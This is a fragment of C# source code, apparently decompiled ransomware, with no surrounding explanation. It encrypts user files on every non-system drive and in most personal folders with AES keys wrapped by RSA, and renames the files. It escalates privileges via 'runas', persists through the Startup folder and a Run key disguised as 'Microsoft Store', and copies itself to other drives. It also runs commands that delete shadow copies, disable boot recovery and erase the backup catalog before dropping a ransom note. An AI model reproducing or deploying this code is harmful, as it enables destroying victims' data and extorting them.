		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
